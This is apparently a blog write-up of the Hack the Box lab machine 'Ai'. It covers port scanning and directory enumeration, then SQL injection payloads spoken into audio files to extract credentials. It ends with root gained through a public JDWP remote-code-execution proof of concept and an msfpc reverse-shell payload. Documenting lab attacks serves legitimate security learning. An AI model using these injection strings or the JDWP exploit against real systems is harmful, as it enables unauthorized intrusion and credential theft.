+++
author = "Nick"
categories = ["hack the box", "text to speech", "gobuster", "SQL Injection", "msfpc", "jdwp"]
date = 2020-01-25T15:31:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2019/12/ai.png"
slug = "hack-the-box-ai"
tags = ["hack the box", "text to speech", "gobuster", "SQL Injection", "msfpc", "jdwp"]
title = "Hack the Box - Ai"

+++


Welcome back! Today we are doing the Hack the Box machine - Ai. This is a Linux box with a medium difficulty. Let's see what's in store!

As always we kick it off with our ```nmap``` scan: ```nmap -sC -sV -T4 -p- -oA all_ports 10.10.10.163```

Here are our results:
```
Host is up (0.060s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.04 seconds
```

Well, it looks like web services are the way in. Let's see whats being hosted on port 80.

![](/images/2019/12/image-34.png)

We have a Artificial Intelligence site. The links lead to ```php``` files. We'll start our enumeration with ```gobuster```.

Command:
```gobuster dir -u ai.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 75 -x php```

Here are our results:
```
/uploads (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/db.php (Status: 200)
/contact.php (Status: 200)
/about.php (Status: 200)
/intelligence.php (Status: 200)
/ai.php (Status: 200)
/server-status (Status: 403)
```

Now we'll start visiting these pages to see if there are any paths forward. We see that the premise of the site is using voice recognition from audio files as a search engine. On the ```ai.php``` page we see there is an upload form requesting a ```.wav``` file. So we'll upload a sample file and see what happens. We get a response:

![](/images/2019/12/image-35.png)

Good to know info, we'll move onto the next page which was ```intelligence.php```. Here is a list of supported API calls. So my logic here is to create a ```.wav``` with some type of text to speach engine using the provided api to craft my payload. 

A quick google search for 'text to speech download' lead me to a few sites. We need the ability to download our crafted payload as well, simply saying it back isn't quite good enough. 

Now let's craft an ```SQL injection``` using our documentation. It's noted at the bottom of the page that they mostly follow Microsoft's approach. So we dig up a list of recognized commands, [here](https://support.microsoft.com/en-us/help/12427/windows-speech-recognition-commands). Now we can seemingly using things like 'open parenthesis' and 'close parenthesis' to craft our statement.

Crafted database command:
```
won open single quote union select database open parenthesis close parenthesis
comment database
```
Is the same as saying:
```
1'union select database()-- -
```

So now that we've input this text-to-speech in, we save the file. Next we need to convert the file to a ```.wav```. There are plenty of ways to do this. Two that can be done nativly in Kali are:

```ffmpeg -i input.mp3 output.wav ``` or ```mpg123 -w output.wav input.mp3```.

Now that we have the payload compiled so to speak, let's upload it.

![](/images/2019/12/ai_database.gif)

Look's like it worked! We have a database name of ```alexa```. We will continue to craft payloads until we get what we need. It should be noted that sometimes the playback speed at certain parts of the payload needed to be slowed down. In the case of finding the table:
```
won open single quote union select table underscore schema comma table underscore name comma won from information underscore schema dot tables
```

This needed to be modified a bit more heavily, speed, emphisis and voice.

After much trial and error, we finally get the user password:

![](/images/2019/12/ai_password.gif)

Great, now we have a username and password. Maybe it'll work for ```SSH```.

![](/images/2019/12/ai_ssh.gif)

We are in. We snag our ```user.txt``` flag and start enumerating for root. We sping up a ```SimpleHTTPServer``` and download ```Linpeas.sh``` onto the box. We see that there are few more open ports available to us:

![](/images/2019/12/image-36.png)

We also see ```Tomcat``` running a cron job:

![](/images/2019/12/image-37.png)

As well as ```Java``` task running that references ```Tomcat``` running on port 8000:

![](/images/2019/12/image-38.png)

After doing some research it looks like this is [Java Debug Wire Protocol](https://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html). THe give away was the jdwp in the process running: ```jdwp=transport```. The first google seach for this came back with quite a few RCE on the protocol. [This one ](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/) does a great job of breaking it down. It also has a proof of concept, [here](https://github.com/IOActive/jdwp-shellifier).

We copy the file to the server and run it.

![](/images/2019/12/image-39.png)

It seems to execute but we never catch a shell via ```netcat```. Let's craft a payload with ```msfpc``` or ```msfvenom```. We issue ```msfpc elf tun0``` to generate a Linux payload. We can then copy this payload to the server under ```/tmp```. Then we will launch our MSF listener and retry our payload. Still doesn't work. After some furthre digging it was suggested to try a different Java method to hook from. We'll use a pretty basic one of ```java.lang.String.indexOf```. This time we run it and get a shell!

![](/images/2019/12/ai_root.gif)

```root.txt``` is right as we land in. Box complete! This was quite a unique box for sure, I really enjoyed it.

Hopefully something was learned. If you found this write-up helpful, consider sending some respect my way: [Lovecore's HTB Profile](https://www.hackthebox.eu/home/users/profile/95635).

